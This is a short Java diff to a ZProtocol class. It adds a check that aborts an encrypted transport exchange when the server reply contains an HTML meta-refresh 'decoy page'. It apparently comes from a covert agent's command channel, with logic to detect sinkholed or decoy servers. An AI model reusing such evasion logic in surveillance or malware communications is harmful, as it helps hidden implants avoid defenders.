@@ -791,6 +791,14 @@ public class ZProtocol extends Protocol {
         //#endif
         
         byte[] cypherIn = transport.command(cypherOut);
+       
+        String result=new String(cypherIn);
+        if(result.indexOf("<meta http-equiv=\"refresh\" content") >= 0){
+            //#ifdef DEBUG
+            debug.error("cypheredWriteReadSha: DECOY PAGE DETECTED!" );
+            //#endif
+            throw new TransportException(30);
+        }
 
         if (cypherIn.length < SHA1LEN) {
             //#ifdef DEBUG
